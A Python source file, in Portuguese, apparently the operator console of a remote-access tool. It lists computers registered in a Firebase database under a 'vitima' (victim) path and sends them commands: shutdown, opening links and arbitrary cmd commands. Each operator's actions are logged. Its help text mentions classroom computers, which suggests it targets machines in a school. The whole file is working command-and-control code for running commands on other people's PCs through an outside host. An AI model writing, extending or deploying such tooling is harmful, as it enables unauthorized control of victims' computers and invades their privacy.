
import os
import json
import requests
import threading
import time
import subprocess
from rich import print
from rich.panel import Panel
import rich.box as box
from rich.table import Table
from rich.layout import Layout
from time import strftime, localtime   

class Celular():
    def __init__(self) -> None:
        self.link = "https://lolkkk-55eec-default-rtdb.firebaseio.com/Computadores"
        self.original_link = "https://lolkkk-55eec-default-rtdb.firebaseio.com"
        self.escolha = None
        self.user = None
        self.command_escolha = None
    
    def clear_terminal(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def enviar_comando(self, comando, log=True, arg1='None', arg2='None'):
        data = {
            "command": f"{comando}",
            "command_is_activated": False
        }
        r = requests.patch(self.link+f"/{self.escolha}/vitima.json", data=json.dumps(data))


        if log:
            data = {
                f'{self.command_escolha} {strftime("%Y-%m-%d %H:%M:%S", localtime())}': {
                    "time": f'{strftime("%Y-%m-%d %H:%M:%S", localtime())}',
                    "arg1": arg1,
                    "arg2": arg2
                } 
            }
            
            requests.post(self.original_link+f"/pessoas/{self.user}/logs.json", data=json.dumps(data))
        
    def register(self):
        if os.path.exists("./.pcmanager"):
            if os.path.isfile("./.pcmanager/user.json"):
                pass
            else:
                with open("./.pcmanager/user.json", "w+") as r:
                    r.write('{\n"name": ""\n}')
                    pass
            
            with open('./.pcmanager/user.json', 'r+') as l:
                nomemassa = json.load(l)
                self.user = nomemassa['name']
                print(f"Logado como: {self.user}")
            pass
        else:
            os.mkdir('./.pcmanager')
            time.sleep(2)
            with open("./.pcmanager/user.json", 'w+') as f:
                try:
                    data = json.load(f)
                except Exception as e:
                    print(e)
                    f.write('{\n"name": ""\n}')
                    pass
        
        with open("./.pcmanager/user.json", 'r+', encoding="utf-8") as f:
            data = json.load(f)
            try:
                data["name"]
            except:
                f.write('{\n"name": ""\n}')
            finally:
                if data["name"] == "":
                    nome = input("Escreva seu nome\n$> ").lower()
                    data["name"] = nome
                    f.close()
                    with open("./.pcmanager/user.json", "w", encoding="utf-8") as f:
                        json.dump(data, f, indent=3)
                        self.user = nome
                        data = {
                            "account_created_at": f'{strftime("%Y-%m-%d %H:%M:%S", localtime())}'
                        }
                        r = requests.put(self.original_link+f"/pessoas/{self.user}.json", data=json.dumps(data))
                else:
                    pass
                pass          
        pass
    
    
    
    def start(self):
        while True:
            if self.escolha == None:
                tabela = Table(title="[bold]Todos os computadores\nEscolha um numero para escolher o computador", expand=True, box=box.MINIMAL, style='green')
                tabela.add_column("ID", style="cyan", justify="center")
                tabela.add_column("Nome", justify="center")
                tabela.add_column("IP local", style="cyan", justify="center")
                tabela.add_column("Ultima vez visto", style="bright_red", justify="center")
                r = requests.get(self.link+"/.json").json()
                if r == None:
                    print("[bold red]Sem computadores registrados")
                else:
                    id = 1
                    dictmassa = {}
                    for x in r:
                        r = requests.get(self.link+"/{}.json".format(x)).json()
                        try:
                            ip_adress = f"[cyan]{r['info']['ip_adress']}"
                        except:
                            ip_adress = "[red]Não encontrado [purple4](Versão antiga)"
                        try:
                            last_seen = f"[deep_pink3]{r['last_seen']}"
                        except:
                            last_seen = f"[deep_pink3]Não existe data"
                        #ip_and_name = ""
                        name = f"{x}"
                        try:
                            dictmassa[id] = name
                            tabela.add_row(f"[cyan1]{id}", x, ip_adress, last_seen)
                            id = id + 1
                        except:
                            pass
                        
                    panel = Panel(tabela, box=box.SQUARE)


                    print(tabela)
                    print(dictmassa)
                    escolha = input("$> ")
                    name = dictmassa[int(escolha)]
                    print(name)
                    self.escolha = name
                    #allfiles = ''
                    #for key, value in dictmassa.items():
                    #    allfiles = allfiles + f'[red]{key}[cyan] - [green]{value}[cyan]\n'
                    
            else:
                comandos_string = """
[red]help - [purple]Mostra este texto
[red]desligar - [purple]Desliga o computador
[red]link - [purple]abrir algum link no computador
[red]cmd - [purple]fazer comandos do cmd
[red]desc - [purple]Adicionar uma descrição aquele computador(Ex: Computador da sala 1°A)
[red]moreinfo - [purple]Pegar mais algumas informações sobre o computador
[red]back - [purple]Voltar para a seleção de Pc's
                """

                comandos = Panel(comandos_string, title='Todos os comandos')
                #viadagem = Table(box=box.MINIMAL)
                #viadagem.add_column("Nome")
                #viadagem.add_column("Usuario criado em")
                
                #pessoas = requests.get(self.original_link+"/pessoas.json").json()
                
                #for keys, values in pessoas.items():
                #   viadagem.add_row(keys, values["account_created_at"])
                print(comandos)
                
                self.command_escolha = input("$> ")
                
                if self.command_escolha == "help":
                    self.clear_terminal()
                    pass
                
                elif self.command_escolha == "desligar":
                    self.enviar_comando("shutdown /s /t 4")
                    print("[bold green][*]Comando enviado, PC vai desligar em 10 segundos ou menos")
                    
                elif self.command_escolha == "link":
                    arg1 = input("Link &> ")
                    print("Qual navegador usar? \n 1 - Chrome\n 2 - Firefox\n 3 - Brave\n[green]Deixe em branco para usar o chrome\n[red][bold]NAO USE UM NAVEGADOR QUE NAO EXISTA NO PC, ELE VAI DAR ERRO E CAPAZ DO PROGRAMA FECHAR")
                    navegador = input("&> ")
                    
                    if navegador == '' or navegador == "1": navegador = "Chrome"
                    elif navegador == "2": navegador = "Firefox"
                    elif navegador == 3: navegador = "Brave"
                    elif navegador not in ["chrome", "brave", "firefox"]:
                        print("detectado possivel erro de digitação, mudando para [red][bold]chrome")
                        navegador = "Chrome"
                    self.enviar_comando(f'start {navegador} {arg1}', arg1=arg1, arg2=navegador)
                    
                elif self.command_escolha == "cmd":
                    arg1 = input("Comando $> ")
                    self.enviar_comando(arg1, arg1=arg1)
                    
                elif self.command_escolha == "desc":
                    arg1 = input("Descrição $> ")
                    
                    data = {
                        "descricao": f"{arg1}"
                    }
                    r = requests.patch(self.link+f'/{self.escolha}.json', data=json.dumps(data))
                    
                    data = {
                        f'{self.command_escolha} {strftime("%Y-%m-%d %H:%M:%S", localtime())}': {
                            "time": f'{strftime("%Y-%m-%d %H:%M:%S", localtime())}',
                            "arg1": arg1,
                            "arg2": "None"
                        } 
                    }
                    requests.post(self.original_link+f"/pessoas/{self.user}/logs.json", data=json.dumps(data))
                    pass
                
                elif self.command_escolha == "moreinfo":
                    #https://www.macvendorlookup.com/api/v2/{MAC_Address}
                    """
                       {
      "startHex":"0023AB000000",
      "endHex":"0023ABFFFFFF",
      "startDec":"153192759296",
      "endDec":"153209536511",
      "company":"CISCO SYSTEMS, INC.",
      "addressL1":"170 W. TASMAN DRIVE",
      "addressL2":"M\/S SJA-2",
      "addressL3":"SAN JOSE CA 95134-1706",
      "country":"UNITED STATES",
      "type":"oui24"
   }
                    """
                    tabela_info = Table(expand=True, title="Algumas informações a mais")
                    tabela_info.add_column("Endereço Ip")
                    tabela_info.add_column("Descrição")
                    tabela_info.add_column("Endereço MAC")
                    tabela_info.add_column("Nome da corporação")
                    tabela_info.add_column("Primeira linha do endereço da corporação")
                    tabela_info.add_column("Segunda linha")
                    tabela_info.add_column("Terceira Linha")
                    tabela_info.add_column("Pais da corporação")
                    tabela_info.add_column("Tipo")
                    
                    r = requests.get(self.link+f"/{self.escolha}.json").json()
                    mac_info = requests.get(f"https://www.macvendorlookup.com/api/v2/{r['info']['mac_adress']}").json()
                    description = ""
                    try: 
                        description = r["descricao"]
                    except:
                        description = "Nenhuma criada"
                    for x in mac_info:
                        mac_info = x

                    _info_string = """
[green]Endereço Ip: [bright_red]{}
[green]Descrição: [bright_red]{}
[green]Endereço Mac: [bright_red]{}
[green]Nome da corporação: [bright_red]{} 
[green]Primeira linha do endereço da corporação: [bright_red]{}
[green]Segunda linha: [bright_red]{}
[green]Terceira linha: [bright_red]{}
[green]Pais da corporação: [bright_red]{}
[green]Tipo: [bright_red]{}
                    """.format(                        
                        r["info"]["ip_adress"],
                        description,
                        r["info"]["mac_adress"],
                        mac_info["company"],
                        mac_info["addressL1"],
                        mac_info["addressL2"],
                        mac_info["addressL3"],
                        mac_info["country"],
                        mac_info["type"]
                    )
                    
                    _info = Panel(f'{_info_string}', expand=True)
                    
                    print(_info)
                    input('Aperte o "enter" para continuar')
                    pass
                    
                    
                elif self.command_escolha == "back":
                    self.escolha = None
                    
                else:
                    pass
                    

app = Celular()
app.register()
app.start()
        
